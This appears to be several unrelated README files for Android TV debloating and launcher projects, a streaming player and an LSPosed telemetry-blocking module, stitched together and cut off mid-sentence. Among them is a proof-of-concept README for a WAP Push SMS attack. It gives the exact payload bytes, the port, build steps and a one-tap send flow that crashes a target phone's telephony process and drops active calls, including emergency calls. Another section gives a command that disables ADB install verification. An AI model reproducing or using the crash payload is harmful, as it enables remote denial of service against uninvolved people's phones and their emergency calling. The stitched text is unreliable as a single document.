content.readme:
# Free My TV **A fast, ad-free home screen for Google TV, LG and Samsung TVs.** Trending picks from your own apps, the weather at a glance, and a look that follows the sunset.
Open source. Built with Claude Code. One button to undo. [**freemytv.io**](https://freemytv.io) · [Install](#install) · [LG TVs](#lg-tvs-webos) · [Samsung TVs](#samsung-tvs-tizen) · [Any TV](#any-tv) · [Make it yours](#make-it-yours)
## What you get - **No ads.** No sponsored rows, banners or autoplaying promos. Not one. - **Your apps, front and center.** The streaming apps you actually use, on a glass shelf. Pick them and their order right on the TV, or (on Google TV and Android TV) let the one you opened last come first. - **Trending, not sponsored.** Three fresh picks every hour (up to six, in Home Settings) from what's trending this week and the latest releases, only from apps you already have, and from the services you choose. The focused one opens wide and the others show their posters. Movies and Shows get their own tabs, and on Google TV your own [Plex library](#your-plex-library-optional) can join in. - **Continue Watching** (Google TV and Android TV). *Home Settings* → *Top of the screen* puts what you left halfway in your apps on top, with its progress, and OK picks it up in its app. Or a big clock, or the picks. - **Your TMDB key from your phone.** *Home Settings* → *TMDB key* shows a QR code: scan it and paste the key. On LG and Samsung, type it with the remote. - **Weather and markets, one press away.** The hour-by-hour forecast (or the next 5 days), sunrise and sunset, and live crypto prices; on LG and Samsung, also rain in the next two hours, the UV index and the air quality. - **Live TV or your box on HDMI, one press away** (LG and Samsung). *Home Settings* → *Live TV button* picks what the first top button opens: Live TV, as before, or one of the TV's HDMI inputs, shown under the name you gave the input on the TV when it has one. On a TV with no antenna, *Home Settings* → *Live TV* takes its tile out of the inputs. - **What's playing.** Music, a podcast or the radio going on in the background shows on the home screen and the screensaver: the title, the artist and the app, from any app that tells Android what it plays (*Home Settings*, off until you turn it on). - **The status at a glance, and a mouse** (Google TV and Android TV). *Home Settings* → *Status icons* puts Wi-Fi or Ethernet, Bluetooth audio and a USB drive at the top of the home screen; off, nothing listens for them. A mouse or an air-mouse remote works too: hover moves the focus, the wheel scrolls, a click picks. - **Light by day, dark by night.** It follows your city's real sunset, the way your phone does. - **A screensaver to match.** Full-screen photos of the picks with a big glass clock. On LG and Samsung, *Home Settings* → *Screensaver* can make it a large clock with the weather instead, drifting slowly so it doesn't burn into OLED screens. Optionally (*Watch from the screensaver*, in Home Settings), OK opens the title on screen in its app, and any other button just closes it. - **Dimming for a dark room** (LG and Samsung). *Home Settings* → *Dim* darkens Free My TV's own screens, not the apps you open: low, medium, high, or automatic (medium from 22:00 to 07:00). Off until you pick it. - **Your own photos** (Google TV and Android TV). Send them from your computer (up to 100): the screensaver shows them, and without picks one is the home screen's background each hour. - **Fast.** 60 fps, every frame in 16.6 ms, on the TV's own chip. The home screen uses 96 MB of memory instead of 242 MB (−60%).
Measured on a 98″ TCL Google TV running Android 14. - **Set up on the TV.** Language, your city, temperature, theme, how many picks and which streaming services they come from, the weather and prices cards, the forecast's hours or days, which coins, and the apps on the shelf, in Free My TV's own settings. - **Safe.** No root. Nothing is uninstalled. One button brings back the factory home screen. ## Install About ten minutes. You need a Google TV or Android TV (Android 8 or newer) and a computer on the same Wi-Fi. The APK goes on the TV, not on your phone (on a phone, the settings say so and nothing switches). ### The easy way: an AI assistant 1. **On the TV**, turn on developer mode: Settings → System → About → press *Android TV OS build* 7 times. Then Settings → System → Developer options → turn on **USB debugging**. Write down the TV's IP address (Settings → Network & Internet). 2. **On your computer**, open an AI coding assistant ([Claude Code](https://claude.com/claude-code), Codex or Antigravity) and say: > Install Free My TV (github.com/simbasjungles/free-my-tv) on my TV at 1

Your TV should do what you paid for.
Ads, tracking and clutter out of your Fire TV. Your apps and HDMI inputs stay.

dumbtv.org · Get started · What it blocks · Devices · Get help

As seen in TechCrunch · TechRadar · Tom's Guide · Gizmodo · XDA · It's FOSS · and more than 150 others

--- ## The story I had a Fire TV Edition television that had become painful to use. Menus lagged, apps took ages to open, and the home screen was mostly ads. When I looked, it had 129 MB of free memory, and much of the rest went to apps that started on their own and to Amazon services that report what you watch. So I asked a coding agent to clean it up over ADB, and [posted what happened](https://x.com/DevMuzzammil/status/2111595814099591535). People asked for the scripts, so I put them here and [shared them](https://x.com/DevMuzzammil/status/2111912547318395338). Since then, owners of about twenty other TVs and sticks have run it and sent back what they found. dumbtv is that cleanup, made safe to run on someone else's TV. ## What it does On a Fire TV stick, Cube or Fire TV Edition television, from your computer, with no root: - **Removes the ads and tracking.** Disables Amazon's sponsored rows, ad services, screen fingerprinting (ACR), telemetry and experiments, and turns off ad tracking and usage reporting. - **Blocks what cannot be disabled.** A small open-source DNS filter on the TV stops Amazon's telemetry and automatic updates from reaching their servers. Everything else, including your streaming apps, works as before. - **Replaces the home screen** with [dumbtv home](launcher/README.md): your apps, your inputs and a clock. 107 KB, open source, no internet access. - **Leaves your apps alone.** Nothing you watch is removed unless you name it. - **Can all be undone** with one command. ## Quick start You need a computer with [`adb`](https://developer.android.com/tools/releases/platform-tools) and about ten minutes. On the TV, turn on ADB: **Settings → My Fire TV → About**, press OK on the device name 7 times, then **Developer Options → ADB debugging**. The TV's IP address is under **Settings → My Fire TV → About → Network** (on a Fire TV Edition television: **Settings → Network**, then the connected network). **With a coding agent** (Claude Code, Codex, Cursor, Gemini and others): clone this repository, open the agent in it, and say: > Clean up my Fire TV. Its IP address is _(the address from the Network screen)_. It reads [AGENTS.md](AGENTS.md), asks you a few questions, and runs the steps below. **By hand:** ```sh git clone https://github.com/humblemuzzu/dumbtv && cd dumbtv adb connect :5555 # press Allow on the TV ./scripts/preflight.sh # what the TV is and what would change; changes nothin

basic_info.description: Debloat a slow, ad-filled Android TV over Wi-Fi and give it a fast Apple TV-style home screen. One prompt for Claude Code, or do it by hand.

content.readme:
# tv-home

**Make a slow, ad-filled Android TV fast and clean again.** Debloat it over Wi-Fi and give it a
tiny Apple TV-style home screen with rotating nature wallpapers. You can hand the whole thing to
Claude Code with one prompt, or do it by hand with the scripts here.

![Before: Google TV home with a sponsored hero. After: clean dock over a Lake Louise wallpaper](before-after.png)

On a 2 GB TCL Google TV this disabled 25 bloat apps and cut the home screen's memory use from
192 MB to 83 MB. Everything is reversible: packages are disabled, never uninstalled.

## Do it with Claude Code (easiest)

1. On the TV: Settings → System → About → press OK on **Build** 7 times → back → Developer options
   → turn on **USB debugging**. Keep the TV on, on the same Wi-Fi as your computer.
2. Clone this repo, open Claude Code inside it (so it can reuse the launcher and scripts), and paste:

   ```text
   My Android TV is slow and full of ads. Find it on my Wi-Fi, connect over ADB, and debloat it:
   disable the manufacturer's ads, telemetry and junk (reversibly, never uninstall), asking me first
   about apps and features I might use. Then build and install a fast, minimal Apple TV-style home
   screen with a dock of my favourite apps and rotating nature wallpapers. Back up before changing
   anything, check every step with screenshots from the TV, and give me a restore script.

   Heads-up from people who've done this: use the adb-shell Python package if macOS blocks adb; on
   Google TV also disable com.google.android.tungsten.setupwraith or it hijacks the Home button; and
   test the Home button from inside an app.
   ```

3. Accept "Allow USB debugging?" on the TV when asked, then answer a few questions: which apps you
   use, which go in the dock, whether you want wallpapers.

The prompt is short on purpose; Claude works out the details. The gotchas below are there in case it gets stuck.

## Do it by hand (macOS)

```bash
./setup.sh                                                  # Python ADB client, JDK 17, Android SDK
tools/find-tv.sh                                            # finds the TV, saves its IP
tools/venv/bin/python -I tools/tv.py --probe                # model, Android version
tools/disable.sh examples/tcl-google-tv-g07/debloat.txt     # or your own list, see examples/
launcher/build-and-install.sh                               # build + install the launcher
```

Undo everything with `tools/restore.sh <the same list>`.

## What's here

| Path | What it is |
|---|---|
| [PROMPT.md](PROMPT.md) | The prompt for Claude Code / any coding agent |
| [launcher/](launcher/) | The home screen. 4.7 MB including the wallpapers; plain Android, no network, no background services |
| [launcher/res/values/config.xml](launcher/res/values/config.xml) | Dock apps, hidden apps, Live TV app, grid columns |
| [tools/tv.py](tools/tv.py) | Pure-Python ADB client: shell, batch, screenshots, chunked APK push |
| [tools/find-tv.sh](tools/find-tv.sh) | Finds Android TVs on your Wi-Fi |
| [tools/type.sh](tools/type.sh) | Type into the TV's on-screen keyboard from your laptop (`tools/type.sh` alone prompts hidden, for passwords) |
| [tools/disable.sh](tools/disable.sh), [tools/restore.sh](tools/restore.sh) | Apply / undo a debloat list |
| [examples/](examples/) | Debloat lists per TV model |

## The launcher

- Clock, greeting and date top-left. Frosted pills top-right for **Inputs** (HDMI/AV/Live TV
  dropdown; the remote's Menu key opens it too), **Wi-Fi** (shows the network name) and **Settings**.
- A dock of your favourite apps. The focused app's name appears above it over a glow coloured from
  its banner. Press Down for every other app in a grid.
- 12 nature photos crossfade every 10 minutes, with a scrim so text stays readable. Swap them in
  `launcher/assets/wallpapers/` (1920×1080 JPEGs, credits in `launcher/WALLPAPER-CREDITS.md`).
- Deterministic D-pad focus, remembers the last tile, picks up newly installed apps on return.

Change the dock: edit `config.xml`, then run `launcher/build-and-install.sh`.

## Gotchas we hit

- **macOS blocks the `adb` binary** on the local network ("No route to host"). `tools/tv.py` uses
  the `adb-shell` Python package instead.
- **Google TV hijacks the Home button.** With the stock launcher disabled, the setup app
  (`com.google.android.tungsten.setupwraith`) has a higher HOME priority than any third-party
  launcher. The install script disables it; `restore.sh` re-enables it.
- **Home opened the launcher behind the current app**, because of a stale home task from switching
  launchers. Force-stopping the launcher and `com.android.tv.settings` and pressing Home fixes it.
  The install script does this.
- **Chained `pm` commands** (`pm disable a; pm disable b`) can silently stop after the first. The
  scripts run one per shell call.
- **Apps installed from the Play Store didn't appear**, because the package broadcast was missed
  while another app was in front. The launcher re-checks wit

# WAP Push Remote Modem Crash (PoC)

Proof-of-concept Android app that sends a crafted 8-byte WAP Push PDU over SMS to a
target handset. The malformed PDU triggers a `NegativeArraySizeException` in
`WapPushOverSms.decodeWapPdu`, which goes uncaught in `InboundSmsHandler` and kills
`com.android.phone` on the receiving device — dropping any active call, including
emergency calls, with no interaction from the victim.

**Full writeup: https://smsofdeath.com/**

## Payload

```
01 06 88 80 80 80 00 BE   → sent as a data SMS to port 2948
```

## Build

```
./gradlew assembleDebug
```

Output: `app/build/outputs/apk/debug/app-debug.apk`

Requires an Android SDK. Create `local.properties` with your SDK path (Android Studio
does this automatically):

```
sdk.dir=/path/to/Android/sdk
```

## Use

Install on a sender device, enter (or auto-fill from an active SIM) the target number,
pick the sending SIM, and tap **SEND CRASH SMS**. Observe on the target:

```
adb logcat | grep -E 'NegativeArraySize|WapPushOverSms|com.android.phone'
```

Expected: `FATAL EXCEPTION` in `com.android.phone` within ~1–2s and a PID change for
that process, with a brief loss of signal.

- `minSdk` 30, `targetSdk`/`compileSdk` 35.
- Requires `SEND_SMS`, `READ_PHONE_NUMBERS`, `READ_PHONE_STATE`.

## Disclaimer

For authorized security research and testing on devices you own or have explicit
permission to test. Do not use against systems or people without consent.

Any streaming site, a real player.
A TV-first Android app that opens the sites you choose, finds the video they play, and plays it in a native hardware-accelerated player.

Documentation · Download · User guide · Build from source · Support

## Why Streaming sites are built for a desktop browser with a mouse. On a TV remote they are painful, they are full of pop-ups, and their embedded players stutter on weak hardware. FMHYPlay keeps the site (so you keep every title and server it offers) but takes over the part that goes wrong: - It **finds the video stream** the page starts and plays it in **FMHYPlayer** (ExoPlayer with the hardware decoder), with nothing painted over the picture. - It **drives the site for you**: pick a title and it opens that title's page (or the exact episode); the player's Episodes, Sub / Dub, Servers and Quality buttons press the site's own buttons, so you do not go back to the page. - It **blocks ads and pop-ups**, **tunnels the app's own traffic** through Cloudflare WARP when you want it, and works with a **TV remote** and with **touch**. ## Features **Cast to TV** - The **Cast** button in the phone's player sends the video to a TV on the same Wi-Fi, from the same spot. The phone becomes the remote: play, pause, seek, ±10 s and TV volume (the phone's volume keys work too) - **TV with FMHYPlay (recommended)**: the TV plays the stream itself, with the site's headers and cookie, WARP, ad blocking and subtitles. It opens even when FMHYPlay is closed on the TV - **Chromecast, Google TV and TVs with Cast built in**: no app needed on the TV; the phone relays the stream so sites still accept it - **DLNA / UPnP smart TVs** (Samsung, LG, Sony, Kodi and others): same relay; works best with MP4 and TS streams, since not every TV plays HLS

**Series and anime** - **Episodes** strip in the player (stills and names along the bottom while the video plays), **Previous** and **Next**, and the next episode starts by itself - **Skip intro, recap and credits** (times from TheIntroDB and AniSkip), with a Next episode button at the credits; *Settings, Skip intros* skips them for you - **Sub / Dub** button for anime, remembered per site - Opens the exact episode directly on 34 TV sites and 22 anime sites; elsewhere it presses the episode in the site's own list or menus **FMHYPlayer** - Hands off automatically when a page starts an HLS, DASH or live FLV stream; falls back to the page if the stream cannot be played - Icon buttons in two groups: Previous, Next, Episodes on the left; Quality, Audio, Sub / Dub, Servers, Subtitles, More, Cast, Full screen on the right; menus open as a side panel; what is picked shows under the title, and on a TV the button the remote is on shows its name - Replays the page's Referer, Origin and cookies, so streams that check them still play - **Resumes where you stopped on any site or server**, with a Restart button; # tv-vibehack 📺✨

> **Transform any ad-bloated Android TV or Google TV into a lightning-fast, tvOS-inspired, fail-safe experience — without root, without bootloop risks, and without losing access to stock features.**

[![Android 14 Ready](https://img.shields.io/badge/Android-14%20(API%2034)-green.svg)](https://developer.android.com/about/versions/14)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Root Required: No](https://img.shields.io/badge/Root-Not%20Required-brightgreen.svg)](#)
[![Zero Bootloop Architecture](https://img.shields.io/badge/Architecture-100%25%20Fail--Safe-orange.svg)](#the-100-fail-safe-architecture)

---

## 📐 Architecture & Transformation Overview

```text
[ STOCK GOOGLE TV ]                             [ NLRC TV VIBEHACK ]
┌──────────────────────────────────────┐        ┌──────────────────────────────────────┐
│  Sponsored Ad Banner (70% Screen)    │        │  NLRC Home · Ambient Clock & Date    │
│  [Trending Shows] [Paid Promotions]  │        │                                      │
│  50+ Bloatware OTT Apps              │   ➔    │                                      │
│  Remote Buttons Lock You In Paywalls │        │  Dock: [HDMI 2 (Cable)] [Media Vault]│
└──────────────────────────────────────┘        └──────────────────────────────────────┘
   • 2.5 GB RAM used                               • 120 MB RAM used
   • Heavy telemetry & tracking                    • 0 Ads · 0 Telemetry · 100% Fail-Safe
```

---

## 🎯 The Motivation

Modern Smart TVs ship with:
- **Sponsored ads covering 70% of the screen**.
- **Sluggish bloatware** and 50+ pre-installed background apps consuming memory and tracking habits.
- **Unremappable sponsored remote buttons** (Netflix, Prime Video) that elderly family members hit by mistake, throwing them into subscription walls.
- **Overly complicated navigation** that makes switching to Cable/HDMI or playing personal home videos a headache.

**tv-vibehack** solves this permanently. Originally built to give aging parents a distraction-free, one-touch TV experience, it provides a universal blueprint for taking back control of any Android TV without root.

---

## ⚡ What Makes This Different?

### 1. 🛡️ The 100% Fail-Safe Architecture (Zero Bootloops)
On Android 14 Google TV, disabling the stock launcher (`com.google.android.apps.tv.launcherx`) breaks Direct Boot, tripping Android's `RescueParty` service and bricking the TV into a black-screen recovery state.

**tv-vibehack never disables `launcherx`.** Instead:
- The custom launcher is **`directBootAware="true"`**.
- A lightweight native **Accessibility Service** (`HomeKeyService`) intercepts Home key events and window transitions in under 10ms.
- If the custom launcher is ever uninstalled or crashes, Google TV seamlessly takes over. **Zero chance of bricking your TV.**

### 2. 🔀 Hardware Passthrough (Direct HDMI Switching)
No more opening 4 nested TV menus just to watch cable. Through reverse-engineered Realtek RTD `TvContract` passthrough URIs, the launcher switches directly to HDMI inputs programmatically:
```java
Uri uri = TvContract.buildChannelUriForPassthroughInput(
    "com.realtek.tv.passthrough/.hdmiinput.HDMITvInputService/HW151519744" // HDMI 2
);
context.startActivity(new Intent(Intent.ACTION_VIEW, uri));
```

### 3. 🎮 Sponsored Remote Key Remapping (No Root)
`HomeKeyService` intercepts hardcoded hardware remote buttons (`KEYCODE_BUTTON_3` for Netflix, `KEYCODE_BUTTON_4` for Prime Video, `KEYCODE_PROG_RED`/`GREEN`) and redirects them straight to HDMI 2 / Set-Top Box in <150ms without root.

### 4. 🎞️ Offline TV Media Vault & Legacy Transcoding
Many families have legacy home videos or recordings stored on USB drives encoded in older formats (e.g., DVD MPEG-2) that native modern Smart TV chipsets cannot decode inside standard MP4 containers.

#### How to Add Your Own Media:
1. **Transcode to Hardware-Accelerated H.264:**
   ```bash
   ffmpeg -i "MyVideo_Part_1.mp4" -c:v libx264 -preset faster -crf 23 -c:a aac -b:a 192k "Part_1.mp4"
   ```
2. **Push Directly into TV Internal Storage:**
   ```bash
   adb shell mkdir -p /sdcard/Movies/NLRC
   adb push Part_1.mp4 /sdcard/Movies/NLRC/Part_1.mp4
   adb push Part_2.mp4 /sdcard/Movies/NLRC/Part_2.mp4
   adb push Part_3.mp4 /sdcard/Movies/NLRC/Part_3.mp4
   ```
3. **Instant D-pad Remote Navigation:**
   Launch **PenDrive / Media Viewer** directly from the dock. No USB stick needs to remain plugged in; videos play natively at 60fps with intuitive remote controls:
   - ◄ / ►: Seek -10s / +10s with real-time HUD.
   - ▲ / ▼ or CH+ / CH-: Switch to Next / Previous part.
   - OK: Play / Pause toggle.

---

## 🚀 Quick Start

### 1. Enable ADB on your Android TV
1. On the TV: **Settings** → **System** → **About** → Click **Build** 7 times to enable Developer Options.
2. Go to **Settings** → **System** → **Developer Options** → Turn on **USB Debugging** (and Network Debugging if available).
3. Connect your computer to the same Wi-Fi

# tvhome-zh

把 Android TV / Google TV 换成 **Apple TV（tvOS）风格**桌面的开源项目，**装完就能用，不折腾**。

**本仓库是 [Gathin23/tv-vibehack](https://github.com/Gathin23/tv-vibehack) 的衍生分支**，遵循原项目 MIT
许可证，版权归原作者 Gathin 所有（见 [LICENSE](LICENSE) 与 [NOTICE](NOTICE.md)）。**非官方项目**，与原作者
及上游社区无隶属关系。

> 上游现已更名为 **CleanYourTV**（官网 [cleanyour.tv](https://cleanyour.tv)），tv-vibehack 的旧链接会重定向过去。
> 上游版本更新更快、功能更多，但设计前提是"你会用 AI 帮你折腾电视"；本仓库解决的是另一件事。

上游的原话是「一个 GitHub 仓库、一个 AI 和十分钟」。它把清理电视的整套方法做成了提示词和脚本，
交给 Claude Code 之类的助手去你家电视上执行——**这套东西需要你愿意折腾**。

本仓库走的是另一条路：**把上游那些"要改配置文件、要重新编译、要推文件"的设置项，全部变成按遥控器就能操作。**
所以它适合这样一类人：

- 想换掉臃肿的广告桌面，但**不想装 JDK、不想编译、不想敲命令行**；
- 家里有老人用电视，希望**开机就是能看的画面**，不需要有人先"配置"一下；
- 中文电视系统，或者干脆想要界面全中文。

如果你要的是上游的全部功能（主题目录、模块卡片、250 KB 瘦身构建等），或者你本来就喜欢自己动手折腾，
**请直接用[上游项目](https://github.com/Gathin23/tv-vibehack)**——它更新更快、功能更多。

## 📦 下载

**➜ [下载最新版 tvhome-zh APK](https://github.com/mclhm8182/tvhome-zh/releases/latest)** · 仅 **373 KB**，纯 Java，无广告 SDK

前往 [Releases 页面](https://github.com/mclhm8182/tvhome-zh/releases) 查看全部版本。

> 上游目前仍**不提供编译好的安装包**（其 release 只附源码），需要自行安装 JDK/SDK 并运行
> `launcher/build-and-install.sh` 编译。本仓库**直接提供编译好的 APK**，一条 `adb install` 就能装上
> ——在"不想折腾"这件事上，这是最实际的差别。

## 这不是什么

把电视盒子臃肿的广告桌面换成一个干净的、苹果 tvOS 观感的桌面：

- **纯黑背景 + 底部四格 Dock**（tvOS 那个浅色圆角条的位置）
- **顶部大字显示**当前聚焦的应用名，带一圈取自应用封面的氛围光
- **按「下」键**应用网格从底部滑出
- **一块悬浮玻璃高光**，在图标之间弹性移动，而不是每个格子各画各的边框
- **四个磨砂按钮**：桌面设置、常用、输入源（HDMI / AV / 直播电视）、Wi-Fi / 设置
- **问候语 + 大号细体时钟 + 日期**（Outfit 字体）
- 可选的**时钟屏保**，防止烧屏

**无广告、无账号、无需 root、无需数据线**，纯 ADB 覆盖安装，一条命令可还原。

### 📦 轻量

安装包只有 **373 KB**（R8 裁剪 + 资源压缩的正式构建），比同类的 TV 桌面轻得多——
纯 Java 实现、仅依赖 `recyclerview` 与 `dynamicanimation` 两个轻量 AndroidX 库，
**没有引入 Compose / Glance 等重型框架，也没有内置广告 SDK 或推荐引擎**。
在 2 GB 内存的国产盒子上实测常驻内存约 **107 MB（PSS）**，运行流畅不拖后腿。
对内存吃紧的低配盒子来说，体积小本身就是优势——装它几乎不占空间。

### 中文版实机截图

在国产电视盒子上运行的样子（简体中文界面）：

![tvhome-zh 桌面截图](docs/screenshot-zh.png)

<details>
<summary>对比：原厂广告桌面（左） vs 本项目桌面（右）</summary>

![Before: stock Google TV home with a sponsored ad. After: the tv-vibehack launcher](docs/stock-vs-new-side.jpg)

</details>

## 和上游的差异

一句话概括：**上游把配置交给文件和命令行，本仓库把配置交到遥控器上。**

### 本仓库独有

| 功能 | 上游 | 本仓库 |
|---|---|---|
| ⭐ **编辑常用应用**（底部 Dock） | 只能改 `config.xml` 再重新编译 | **按遥控器菜单键**打开面板勾选，或**长按**图标置入/移出；改动存在电视本地 |
| 🎨 **壁纸** | 需用 ADB 把 `wallpaper.jpg` 推到电视上 | 面板里一键开启**必应每日壁纸**，或**从电视里选自己的图**；新图自动替换旧图，**空间恒定一张**，不会越攒越多 |
| 🔢 **每行图标数 3–8** | 只能推 `config.json` 或改配置重编译 | 面板里点一下循环切换；首次使用**按屏幕实际宽度自动推荐** |
| 🌓 **Dock 底板自适应** | 固定不透明，亮色壁纸下像一块黑砖 | 有壁纸时自动转为半透明压暗，纯黑背景时保持原样 |
| 🇨🇳 **中文界面** | 已有（`values-zh-rCN`） | 简繁中文齐全，另补齐德/西/法/俄/加泰/泰/阿/波/塞/土/挪/希/葡/芬/越/孟/捷/意/印尼/荷/乌兹/乌克兰，共 24 种语言 |
| ⌨️ **菜单键快捷设置** | 需改配置文件开启，且按键映射因电视而异 | **菜单键直接弹出**玻璃浮层（电视设置/显示/网络/管理应用/常用/桌面设置），可选择在别的应用里也接管 |
| 🐢 **低配优化** | 减弱动画只是配置文件里的一项；低内存时会自己保着磁贴不放 | **遥控器上一键切「减弱动画」**（补间全免，聚焦放大保留）；**内存紧张时自动放掉磁贴封面与壁纸**，回来再重建 |
| 🌤 **天气** | 独立 App，靠模块卡片挂上来 | **桌面时间下方一行**（城市+温度+天气），点开是玻璃面板：体感、空气质量、**每小时**、未来三天、**50 个常用城市直接点选**、**一键定位我的城市** |
| 🔌 **小米电视切信号源** | 无（标准切源接口在小米国行固件上无效） | **自动识别**小米国行固件，改走小米自己的播放器切源（HDMI 1/2/3、AV），**不用改任何设置**；海外固件不受影响 |
| 📦 **提供编译好的 APK** | 不提供二进制，需自行编译 | release 页直接下载（**373 KB** 正式构建），一条命令装上 |

### 本仓库暂缺（上游有，这里没有）

诚实地列出来，你需要的话请用上游：

- 主题目录一键推送（`themes/`）、模块卡片（其他应用可插入磁贴）
- 首启 AOT 预编译（本仓库是 R8 瘦构建，但不做 AOT）
- 桌面上直接切换 HOME 的快捷磁贴、VPN 应用标记、波斯历显示

其余部分（tvOS 观感、玻璃高光、时钟屏保、`config.json` 覆盖机制、去广告脚本、还原脚本等）
均来自上游，遵循原项目 MIT 许可证。

**默认配置保持通用**，不预设任何片商或设备专属设置，适合任意品牌电视盒子。

### ⭐ 编辑常用应用（底部 Dock）

Dock 就是底部那一排常用应用。两个入口，随你喜欢：

- **按遥控器菜单键**（有些遥控器叫「选项」/长按菜单）→ 弹出「常用应用」面板，列出全部已装应用，已固定的带勾，点一下切换；
- **长按任意应用图标** → 直接置入 Dock；Dock 已满时点它会顶替第一个位置。

选择保存在电视本地，**下次开机依然有效**。想清空就在面板里逐个取消勾选。

### 🎨 桌面设置面板

顶栏第一个磨砂按钮，点开后是一块面板，**所有设置都在这里，不用碰任何配置文件**：

- **必应每日壁纸**——开关打开即每天自动换一张（关掉只停止每日更换，当前壁纸会保留）；
- **每行图标数**——点一下在「自动 / 3 / 4 / 5 / 6」之间循环，当前值和来源始终显示在标题下方；
- **从电视中选择图片**——调用系统文件选择器，电视里存的图都能用，自动裁剪适应屏幕；
- **移除壁纸**——恢复纯黑背景。

### 🔧 进阶：换主题 / 推配置（不用重新编译）

桌面启动时也会自动读取电视上的这个目录（可放 `config.json` 和 `wallpaper.jpg`）：

```
/sdcard/Android/data/com.gathin.tvhome/files/
```

- 放一张 `wallpaper.jpg` → 重启桌面即成为背景（删掉即恢复纯黑）；
- 放一个 `config.json` → 覆盖 Dock、列数、背景色等内置默认值。

仓库里的 [`tools/set-wallpaper.sh`](tools/set-wallpaper.sh) 是一键换壁纸脚本（`./set-wallpaper.sh <电视IP> <图片路径>`）。
走 ADB 推配置文件是给进阶用户用的；不想碰命令行的话，上面那个面板就够了。

## 设备兼容性

### Android 11 的包可见性（本项目能解决）

很多国产 TV 应用在 Android 11 上会出现「应用列表只显示几个 App」的问题——这是
**Android 11 包可见性**（package visibility）限制：应用必须声明 `<queries>` 才能看到其他应用。
本项目 `targetSdk 29`，在 Android 11 上属于「旧版行为」，能正常枚举全部应用，无需额外声明。

这在国产盒子（普遍停留在 Android 11）上尤其重要。

### 部分厂商固件拒绝安装第三方桌面（本项目解决不了）

极少数国产电视固件会**以自家原生桌面的签名做校验**，任何签名不同的桌面 APK 都会被拒绝安装，
在 ADB 下表现为 `INSTALL_FAILED_VERIFICATION_FAILURE`，日志里通常有类似
`verifier: signature does not match ... will not be installed!` 的记录。

已知情况：**部分 TCL 中国区固件**（如 tcl_mt5879_cn、falcon 鹤 6 等）会这样。上游同样被拒
（上游 README 亦记录 "A few China-market TCL sets refuse to install any launcher at all"）。

**但多数情况下能绕过去**，因为被拒的是"安装校验"这一步，而不是桌面本身。装之前先关掉它：

```bash
adb shell settings put global verifier_verify_adb_installs 0
adb install -r tvhome-zh.apk
```

或者在电视上：**设置 → 安全 → 安装验证

# AntiFraudBlock · 反诈上报阻断 一个只做一件事的 LSPosed 模块：**掐断手机管家 AI 反诈的遥测与云端上报，本地风险提醒照常工作。** 作用域只有 `com.coloros.phonemanager`（ColorOS / OPPO 手机管家），不碰系统框架、不碰其他应用。 ```text com.coloros.phonemanager 17.1.6 · ColorOS 16 · Android 16 · RMX5200 ``` --- ## 为什么单独做模块，不并进 LuckyTool | 理由 | 具体 | |---|---| | 作用域不同 | LuckyTool 的 scope 表全是 ColorOS 包，没有 `com.miui.*`；它的页面是 Compose 硬编码页（`ScopePageRegistry` 里 51 页固定排序），每加一页都要动注册表 + 功能树 + 字符串 | | 上游会变 | LuckyTool 一更新，本地改动就要重新对齐 `ScopePageSpec` / `HookAppFeatureProvider`，冲突成本高 | | 功能边界清晰 | 本模块只有"阻断上报"一条链路，出问题能整包关掉，不影响 LuckyTool 的其他增强 | HyperCeiler / Cemiuiler / MIUI_NoGuard 那套（`com.miui.guardprovider`、`com.miui.analytics.onetrack.*`、`trustservice` 的 `mrmd`）是纯小米命名空间，在 ColorOS 上**一个 class 都不存在**，没法照搬。 --- ## 实测链路（不是推测，全部从本机 APK 反出） APK：`/product/priv-app/PhoneManager/PhoneManager.apk`，v17.1.6，5 个 dex，**类名未混淆**。 | 层 | 真实类 / 方法 | 干什么 | 本模块 | |---|---|---|---| | 反诈埋点封装 | `aivoicecalldetect.utils.AiDetectStatistics`
`b/c/d/e/g/h/i/j`（static void） | 主开关点击、事件计数、推送触达、误报反馈、VOIP 白名单外应用 | **拦截** | | 云端 DCS 上报 | `aivoicecalldetect.utils.AiVoiceDetectDCSUtils`
`m(int,String,boolean,String,String)` / `n(Context)` | 上传号码、包名、通话时长、检测时长、判定码 | **拦截** | | 事件最终出口 | `com.oplus.nearx.track.TrackApi.E(String appId, String event, Map)`
appId = `"20092"` | 所有手机管家遥测的公共出口 | **按事件名拦截** | | 本地记录落库 | `RiskWarningUtilsKt.insertFraudDetectSecurityEvent` | 反诈记录页的数据来源 | 保留 | | 本地风险通知 | `FraudDetectNotificationHelperKt.showRiskNotification` | 通知栏诈骗提醒 | 保留 | | 本地风险弹窗 | `FraudRiskDialogActivity` | 通话中/事后弹窗 | 保留 | | 本地检测服务 | `AiVoiceDetectForegroundService` | 通话反诈检测本身 | 保留 | | 本地记录页 | `SecurityEventStatisticsVM` / `SecurityEventStatisticsActivity` | 读本地 DB，不走 TrackApi | 保留 | 被拦的事件名（实测存在于 `AiDetectStatistics` 各 suspend lambda 里的 `vf.l.r(ctx,"20092",,map)`）： ```text anti_fraud_switches anti_fraud_events_count anti_fraud_master_switche anti_fraud_handle_event anti_fraud_false_report_event ai_detect_result_event ai_detect_voip_app_outside_lists ``` 外加前缀兜底：`anti_fraud*` / `ai_detect*` / `fraud*`，用于接住后续版本新增的事件名。 ### 三层为什么都拦 - 只拦 `AiDetectStatistics` → 漏掉 `SimCallDetectManager` / `VoipCallDetectTriggerReceiver` 直接调 `AiVoiceDetectDCSUtils.m(...)` 的那条（这条带**手机号**，最敏感）。 - 只拦 `AiVoiceDetectDCSUtils` → 漏掉 `ExaminationStatisticsUtilsKt` 直接调 `.n(context)` 与 `TrackApi.E` 的场景。 - 三层都拦 + sink 兜底 → 新版加了新埋点入口也能被事件名前缀接住。 --- ## 本地功能为什么不受影响 `SecurityEventStatisticsVM` 的数据来自本地 DB（`insertFraudDetectSecurityEvent` → `records.e`），`FraudDetectNotificationHelperKt` 直接发通知，`FraudRiskDialogActivity` 直接起 Activity —— 这三条都**不经过** `TrackApi.E`，也不看 `AiDetectStatistics` 的返回值。 所以：**手机照常弹诈骗提醒、照常在记录页留历史，只是不再往云端和统计平台上报。** --- ## 安装 1. 安装 `release/AntiFraudBlock-2.0.apk` 2. LSPosed 里启用，作用域勾 **手机管家（com.coloros.phonemanager）** 3. 强停手机管家后重新打开（`am force-stop com.coloros.phonemanager`） 命令行装 + 验证： ```bash adb install -r AntiFraudBlock-2.0.apk # LSPosed 2.2.0 起有 lspctl，可直接核对状态 /data/adb/modules/zygisk_lsposed/lspctl module show com.eta.afb # API: min=101 target=102 / Type: modern 